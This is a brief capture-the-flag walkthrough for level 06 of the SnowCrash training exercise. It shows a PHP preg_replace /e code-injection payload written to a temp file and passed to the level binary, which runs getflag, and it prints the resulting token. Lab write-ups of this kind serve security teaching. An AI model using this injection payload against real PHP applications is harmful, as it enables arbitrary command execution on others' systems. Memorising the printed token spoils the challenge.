# Level 06

## Vulnerability

## Context

## Solution

"If the above example was written with preg_replace() and the e modifier, the code could be easily exploited by passing in a string"

```
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
```

```
level06@SnowCrash:~$ cat /tmp/getflag
[x {${`getflag`}}]
```

```
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
